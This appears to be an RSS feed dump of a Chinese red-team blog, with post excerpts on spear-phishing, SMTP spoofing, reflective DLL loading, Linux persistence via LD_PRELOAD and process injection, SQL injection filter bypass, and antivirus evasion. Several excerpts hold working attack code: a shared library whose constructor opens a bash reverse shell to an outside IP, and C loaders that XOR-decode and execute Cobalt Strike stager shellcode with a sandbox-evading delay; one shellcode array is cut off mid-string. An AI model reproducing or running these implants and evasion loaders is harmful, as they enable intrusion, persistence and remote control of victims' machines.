1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved ) { BOOL bReturnValue = TRUE; switch( dwReason ) { case DLL_QUERY_HMODULE: if( lpReserved !</description></item><item><title>红队行动之鱼叉攻击-研究分享</title><link>https://payloads.online/archivers/2020-02-05/1/</link><pubDate>Wed, 05 Feb 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-02-05/1/</guid><description>演讲简介 《红队行动之鱼叉攻击》围绕着SMTP协议展开，为大家介绍SMTP相关的安全协议，同时会讲解鱼叉攻击的整体过程，以及模拟APT报告进行自动化、武器化的设计。在讲解的过程中，核心围绕Domain-Fronting和External C2这两类红队较为关注的技术，穿插一些HTTP协议相关的基础知识和木马的编写构建。
演讲目标 为大家分享SMTP协议相关的基础知识，使大家对邮件安全有一定了解，对未来可能遇到的邮件安全相关问题做一个知识储备，同时也更希望能让大家感受火热的技术氛围，热爱红队、热爱研究，不断攻克工作中遇到的难题。
鱼叉攻击概念 “鱼叉攻击”通常是指利用木马程序作为电子邮件的附件，发送到目标电脑上，诱导受害者去打开附件来感染木马。
在2019年的上半年，安全客上披露了穷奇、海莲花这两个APT组织的攻击活动
穷奇（毒云藤） 穷奇组织是一个对我国持续攻击时间长达数十年的老牌APT组织，该组织的攻击活动在2015年左右达到高峰，之后的活动慢慢减少，2019年以来该组织活动减少了很多，攻击频次和攻击范围都大大缩小，但其依然保持活动，如2019年3月份，该组织就使用编号为CVE-2018-20250的WinRAR ACE漏洞向中国大陆数十个重点目标投递了多个RAT木马。投递的RAT木马核心与3年前的版本相比除了配置信息外并未发现新的功能性更新，由此也可印证该组织的活跃度确实在下降。
海莲花（APT32、OceanLotus） 其攻击的目标众多且广泛，包括政府部门、大型国企、金融机构、科研机构以及部分重要的私营企业等。该组织攻击人员非常熟悉我国，对我国的时事、新闻热点、政府结构等都非常熟悉，如刚出个税改革时候，就立马使用个税改革方案做为攻击诱饵主题。此外钓鱼主题还包括绩效、薪酬、工作报告、总结报告等。
鱼叉攻击背后的攻击链路 通常情况下，黑客通过投递邮件到目标邮件服务器，受害者接收后，经受邮件的诱惑、欺骗，会尝试运行邮件附带的木马，最后进入模块化加载的过程。其中，APT组织在木马模块化的构建过程中，会采用穿插多种复杂的技术以及文件格式，涉及加密解密、Shellcode隐写混淆、反射DLL加载、DLL注入、系统特性等。
经历过木马模块化的过程后，转而进入C2环节，“C2环节占了红队的大部分工作周期”，通过C2环节来横向攻击，对目标进行长期的摸排，寻找数据再进而获取数据，这就是整个红队鱼叉的过程。
SMTP协议简介 简单邮件传输协议 (Simple Mail Transfer Protocol, SMTP) 是在Internet传输email的事实标准。
RFC821：https://tools.ietf.org/html/rfc821
SMTP默认端口：25 SSL SMTP默认端口：465 SMTP相关安全协议 - SPF 发件人策略框架(Sender Policy Framework , SPF)是为了防范垃圾邮件而提出来的一种DNS记录类型，它是一种TXT类型的记录，它用于登记某个域名拥有的用来外发邮件的所有IP地址。
https://www.ietf.org/rfc/rfc4408.txt
&amp;quot;v=spf1 mx ip4:61.0.2.0/24 ~all&amp;quot;
设置正确的 SPF 记录可以提高邮件系统发送外域邮件的成功率，也可以一定程度上防止别人假冒你的域名发邮件。
SMTP相关安全协议 - DKIM DKIM是为了防止电子邮件欺诈的一种技术，同样依赖于DNS的TXT记录类型。这个技术需要将发件方公钥写入域名的TXT记录，收件方收到邮件后，通过查询发件方DNS记录找到公钥，来解密邮件内容。
https://tools.ietf.org/html/rfc6376
SMTP相关安全协议 - DMARC DMARC（Domain-based Message Authentication, Reporting &amp;amp; Conformance）是txt记录中的一种，是一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议，其核心思想是邮件的发送方通过特定方式（DNS）公开表明自己会用到的发件服务器（SPF）、并对发出的邮件内容进行签名(DKIM)，而邮件的接收方则检查收到的邮件是否来自发送方授权过的服务器并核对签名是否有效。对于未通过前述检查的邮件，接收方则按照发送方指定的策略进行处理，如直接投入垃圾箱或拒收。
https://en.wikipedia.org/wiki/DMARC#Alignment
SMTP基础报文结构 这个报文结构需要拿出来重点的阐述一下。
以HTTP协议举例，HTTP协议中有状态码的概念，用于表示当前请求与响应的状态，通过状态码可以定位可能的问题所在，SMTP与HTTP非常相似，都是明文协议。早期SMTP协议的开发初衷是为了解决一个大学中实验室成员进行通信、留言的问题，但随着互联网的发展，SMTP的应用越来越广泛。
在SMTP协议中，也有状态码的概念，与HTTP协议相同，250表示邮件传送成功。整个SMTP报文分为两类：
信封 信的内容 注意观察，其中信封中有MAIL FROM，而信的内容中，也有MAIL FROM，这时问题就出现了。
SMTP Relay欺骗攻击 通过比对STMP两个报文，我们可以发现，右边的报文中的From信的内容被更改了，此时当B@examle2.</description></item><item><title>2019年度总结随想</title><link>https://payloads.online/archivers/2020-01-25/1/</link><pubDate>Sat, 25 Jan 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-01-25/1/</guid><description>关于我的自述 2019年是我成长与变化最大的一年，从前的我从自闭、抑郁、不自信到今天，已经阳光到不行不行了，从上家单位离职时，依稀记得和领导说：“有问题我就去解决问题”，还真是乐观的冲锋派。
如果让我用几个词总结2019，那么我会给出如下答案：青春、感动、视角、沉稳。
2019 我组建了一个实验室，第一感觉就是青春，与年龄增长无关，而是一种无所遁形的向心力和张力，给我的人生画下了重要的一笔。同时在共同克服难题的过程中，大家相互体谅，我无以言表，只能不断为大家争取更多的利益，让大家都有成长。我个人认为20岁-25岁还没有学会如何成长，那这个人将会是最快被淘汰的一个，这五年内要对事物的规律拥有一定的掌控力，不然就失去了核心竞争力。再来说说“视角”，从不同人的角度去考虑同一个问题这就是简单的切换视角，不断的切换视角是情商高的表现。某天和我的Leader聊天的时候，聊到部门的建设，我说部门发展至今，有几个前提条件，第一是公司的信任，高层认为这个投入与产出是合理的，第二是资源的倾斜，最典型的表现就是经济特区的开放，第三个就是优秀的价值观宣贯。这三点是我站在从前从未有过得视角总结出来的，或者说没有这个视角也不会思考这种问题。就好像看着天空上的云朵，但是背后还有一大片苍穹和宇宙。
抓住该有的执着 我非常热爱技术，什么都想会一点，至今为止都觉得全能高手是存在的，也不会浮躁，只优先选择自己热爱的，这点是有些固执的，时常沉浸其中、乐在其中，做技术带给我的反馈有很多，它不断的印证一就是一，不管如何都不会变成二。其次，不断印证类似于成功学中的大道理，努力就有收获之类的话题。技术是我的爱好，而我的工作建设在爱好之上，这对于许多人来说是多么幸福的一件事啊。但有一天我开始怀疑，因为我从一个前辈身上感受到，他除了有和我相同类似的工作的同时，还拥有一个更热爱的爱好，我觉得这是对幸福的一种加持。我开始觉得工作与爱好的融合会让爱好变得浑浊，不那么纯粹。工作是有棱角的，而爱好是没有棱角的。这样的情况普遍也很多，这倒也还算过得去。
最后的最后 现在是2020.01.25 01:12 ，在杭州。今年没有回家，外面疫情还在慢慢控制，和家人基本没有怎么出门，还好家人立马重视起来了，都戴了口罩，希望这个疫情快快消散，大家都永远健康。
2020年，愿我的朋友们，只争朝夕，不负韶华，能遇到更好的自己！
倾旋 2020.01.25 01:12</description></item><item><title>静态恶意代码逃逸（第六课）</title><link>https://payloads.online/archivers/2020-01-02/1/</link><pubDate>Thu, 02 Jan 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-01-02/1/</guid><description>代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
0x01 MemoryModule 先来介绍以下MemoryModule这个项目的来源。
MemoryModule-实现原理
项目背景：Windows操作系统在执行一个Windows PE格式的文件时，Windows自身是有一个Windows PE格式的解析器，通过PE格式把文件的各个节放入不同的内存区域。
爱折腾的程序员自己也想实现这个过程，那就是反射，这个反射机制就是将Windows PE格式通过自己写的代码进行解析，并把不同的节数据加载到内存中，通常这个反射加载技术被很多APT组织、大型渗透框架、病毒作者使用比较广泛。
当一个Windows PE格式的文件变成了一个内存中的字符串，意味着这个文件可以被任意方式去转换、加密、混淆，因此反病毒软件也难以查杀。
MemoryModule就是实现了这个过程：https://github.com/fancycode/MemoryModule
但是资料都是英文的，我在国内的社区上找到了中文版本的：https://gitee.com/china_jeffery/MemoryModule
0x02 反射DLL加载的实验 首先体验一下正常DLL加载的过程：
写一个DLL：
1 2 3 4 5 6 #include &amp;lt;Windows.h&amp;gt; VOID msg(VOID){ MessageBox(NULL,TEXT(&amp;#34;Test&amp;#34;),TEXT(&amp;#34;Hello&amp;#34;),MB_OK); return; } 这里我采用了Def文件来进行导出：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include &amp;lt;Windows.h&amp;gt;; typedef VOID (*msg)(VOID); int main() { msg RunMsg; HMODULE hBadCode = LoadLibrary(TEXT(&amp;#34;BadCode-DLL.dll&amp;#34;)); RunMsg = (msg)GetProcAddress(hBadCode,&amp;#34;msg&amp;#34;); RunMsg(); FreeLibrary(hBadCode); return 0; } 通过LoadLibrary这个API来加载DLL文件，使其运行，看起来是一个基础操作，那么还有另外一种方式吗？</description></item><item><title>Linux权限维持之LD_PRELOAD</title><link>https://payloads.online/archivers/2020-01-01/1/</link><pubDate>Wed, 01 Jan 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-01-01/1/</guid><description>LD_PRELOAD Linux操作系统的动态链接库在加载过程中，动态链接器会先读取LD_PRELOAD环境变量和默认配置文件/etc/ld.so.preload，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和/etc/ld.so.preload配置文件中指定的动态链接库依然会被装载,因为它们的优先级比LD_LIBRARY_PATH环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。
通过LD_PRELOAD环境变量，能够轻易的加载一个动态链接库。通过这个动态库劫持系统API函数，每次调用都会执行植入的代码。
dlsym dlsym是一个计算机函数，功能是根据动态链接库操作句柄与符号，返回符号对应的地址，不但可以获取函数地址，也可以获取变量地址。
dlsym定义在Linux操作系统中的dlfcn.h中，函数原型如下：
void * dlsym(void * handle,const char * symbol)
handle：由dlopen打开动态链接库后返回的指针； symbol：要求获取的函数或全局变量的名称。 返回值：void * 指向函数的地址，供调用使用。
劫持示例代码：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;dlfcn.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; int puts(const char *message) { int (*new_puts)(const char *message); int result; new_puts = dlsym(RTLD_NEXT, &amp;#34;puts&amp;#34;); // do some thing … // 这里是puts调用之前 result = new_puts(message); // 这里是puts调用之后 return result; } 编译命令：</description></item><item><title>Linux权限维持之进程注入</title><link>https://payloads.online/archivers/2020-01-01/2/</link><pubDate>Wed, 01 Jan 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-01-01/2/</guid><description>说明 通过进程注入技术，能够使得动态链接库被加载到一个正在运行的进程，因此较为隐蔽。进程注入通过调用ptrace()实现了与Windows平台下相同作用的API 函数CreateRemoteThread()。在许多Linux发行版中，内核的默认配置文件/proc/sys/kernel/yama/ptrace_scope限制了一个进程除了fork()派生外，无法通过ptrace()来操作另外一个进程。
要注入进程前，需要关闭这个限制（Root权限）：
echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope
在Github上已经有了关于进程注入的实现代码：https://github.com/gaffe23/linux-inject
下载后进入项目目录，执行：make x86_64 即可编译64位的linux-inject。
确认编译是否正常：
获取sample-target的PID后，调用inject程序来注入sample-library.so，注入成功会输出“I just got loaded”。 接下来，需要更改sample-target.c文件，编译成需要的权限维持动态链接库。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;dlfcn.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; void shell() { printf(&amp;#34;I just got loaded\n&amp;#34;); system(&amp;#34;bash -c \&amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.170.138/139 0&amp;gt;&amp;amp;1\&amp;#34;&amp;#34;); } __attribute__((constructor)) void loadMsg() { shell(); } 通过如下命令编译so文件：
1 clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o u9.</description></item><item><title>SQL Server DBA WriteFile</title><link>https://payloads.online/archivers/2020-01-01/3/</link><pubDate>Wed, 01 Jan 2020 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2020-01-01/3/</guid><description>0x01 前言 本文非基础类的普及文章，主要分享内网中遇到的一个有趣案例。
0x02 Bypass注入点 通常情况下，遇到SQL Server注入点，我会比较关注是否是DBA权限，如果是，那么就可能拿到执行命令的权限，进而反弹到Ｃ2上，方便后续的后渗透工作。
一开始在一处比较复杂的功能点发现了SQL Server的注入，也是首先利用AND进行判断：
参数：ModuleType存在注入点，但是后面有一层站点全局输入的检测机制，从简单的测试来看，是不存在语法分析的一种，比较容易绕过。
我尝试了以下方案：
and -&amp;gt; And and -&amp;gt; /**/And and -&amp;gt; /*xsww!s*/And and -&amp;gt; /*xswwS1154-_[0)}!s*/And and -&amp;gt; /***/And 最终发现第五种可以绕过，使得后端无法辨别/***/是否和And是一个本体。
那么我猜想到了一个简单的表达式，似乎和这个过滤规则比较相向：/*\w{0,}*/
0x03 tamper 自动化实现 这里我比较懒，直接改了以下space2comment.py，这个脚本在Kali Linux中的sqlmap目录下：
核心代码：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 for i in xrange(len(payload)): if not firstspace: if payload[i].isspace(): firstspace = True retVal += &amp;#34;/**/&amp;#34; continue elif payload[i] == &amp;#39;\&amp;#39;&amp;#39;: quote = not quote elif payload[i] == &amp;#39;&amp;#34;&amp;#39;: doublequote = not doublequote elif payload[i] == &amp;#34; &amp;#34; and not doublequote and not quote: retVal += &amp;#34;/**/&amp;#34; continue 只需要替换/**/即可：</description></item><item><title>静态恶意代码逃逸（第一课）</title><link>https://payloads.online/archivers/2019-11-10/1/</link><pubDate>Sun, 10 Nov 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-11-10/1/</guid><description>0x00 前言 前五课的代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
在此之前，我分享过《高级后渗透C2免杀与对抗》，其中对于一些原理铺垫上稍有欠缺，因此准备分成几篇文章来展开。
0X01 恶意代码的定义 以下文章中的所有关于恶意代码的定义都以Cobaltstrike的载荷为例。
0x02 Shellcode定义 Shellcode是一段机器指令的集合，通常会被压缩至很小的长度，达到为后续恶意代码铺垫的作用。当然你可以通过msfvenom生成各种用于测试的shellcode。
0x03 RAW文件 RAW 中文意思是原始的、未经加工的，通常使用Cobaltstrike生成的BIN文件。
RAW文件是可以直接进行字节操作读取的，因此加载到内存较为方便，通常我一般使用混淆的方式再生成一遍。
0x04 C文件 C文件给出的是一个C语言中的字符数组，也是可以通过以字节单位操作的。
0x05 组合 由于反病毒软件对于默认生成的文件查杀较为严格，我通常会采用混淆、加密解密的方式把载荷还原。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 import sys from argparse import ArgumentParser, FileType def process_bin(num, src_fp, dst_fp, dst_raw): shellcode = &amp;#39;&amp;#39; shellcode_size = 0 shellcode_raw = b&amp;#39;&amp;#39; try: while True: code = src_fp.</description></item><item><title>静态恶意代码逃逸（第三课）</title><link>https://payloads.online/archivers/2019-11-10/3/</link><pubDate>Sun, 10 Nov 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-11-10/3/</guid><description>0x01 关于内存申请的优化 前五课的代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
本章只提及一下关于VirtualAlloc的建议。
https://docs.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
在申请内存页时，一定要把控好属性，可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性 -&amp;gt; 可执行。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 #include &amp;lt;Windows.h&amp;gt; // 入口函数 int wmain(int argc,TCHAR * argv[]){ int shellcode_size = 0; // shellcode长度 DWORD dwThreadId; // 线程ID HANDLE hThread; // 线程句柄 DWORD dwOldProtect; // 内存页属性 /* length: 800 bytes */ unsigned char buf[] = &amp;#34;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&amp;#34;; // 获取shellcode大小 shellcode_size = sizeof(buf); /* 增加异或代码 */ for(int i = 0;i&amp;lt;shellcode_size; i++){ buf[i] ^= 10; } /* VirtualAlloc( NULL, // 基址 800, // 大小 MEM_COMMIT, // 内存页状态 PAGE_EXECUTE_READWRITE // 可读可写可执行 ); */ char * shellcode = (char *)VirtualAlloc( NULL, shellcode_size, MEM_COMMIT, PAGE_READWRITE // 只申请可读可写 ); // 将shellcode复制到可读可写的内存页中 CopyMemory(shellcode,buf,shellcode_size); // 这里开始更改它的属性为可执行 VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;amp;dwOldProtect); // 等待几秒，兴许可以跳过某些沙盒呢？ Sleep(2000); hThread = CreateThread( NULL, // 安全描述符 NULL, // 栈的大小 (LPTHREAD_START_ROUTINE)shellcode, // 函数 NULL, // 参数 NULL, // 线程标志 &amp;amp;dwThreadId // 线程ID ); WaitForSingleObject(hThread,INFINITE); // 一直等待线程执行结束 return 0; } https://www.</description></item><item><title>静态恶意代码逃逸（第二课）</title><link>https://payloads.online/archivers/2019-11-10/2/</link><pubDate>Sun, 10 Nov 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-11-10/2/</guid><description>0x01 关于Windows操作系统内存 前五课的代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
这里还是稍微展开介绍一下，Windows操作系统的内存有三种属性，分别为：可读、可写、可执行，并且操作系统将每个进程的内存都隔离开来，当进程运行时，创建一个虚拟的内存空间，系统的内存管理器将虚拟内存空间映射到物理内存上，所以每个进程的内存都是等大的。
操作系统给予每个进程申请内存的权力，使用不同的API，申请的内存具有不同的涵义。
在进程申请时，需要声明这块内存的基本信息：申请内存大小、申请内存起始内存基址、申请内存属性、申请内存对外的权限等。
申请方式：
HeapAlloc malloc VirtualAlloc new LocalAlloc … 0x02 申请内存API的关系 其实以上所有的内存申请方式都与VirtualAlloc有关，因为VirtualAlloc申请的单位是“页”。而Windows操作系统管理内存的单位也是“页”。
0x03 实现一次正常加载 这里我创建了一个C++项目，名字为：BadCode
先来使用cobaltstrike默认的shellcode进行加载，为了方便阅读参考，在代码中我会尽量留下注释。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 #include &amp;lt;Windows.h&amp;gt; // 入口函数 int wmain(int argc,TCHAR * argv[]){ int shellcode_size = 0; // shellcode长度 DWORD dwThreadId; // 线程ID HANDLE hThread; // 线程句柄 /* length: 800 bytes */ unsigned char buf[] = &amp;#34;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x90\x1f\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x60\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x50\x45\x4f\x78\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x4e\x4c\x4e\x4c\x29\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x54\x2d\x46\x49\x4c\x45\x21\x24\x48\x2b\x48\x2a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x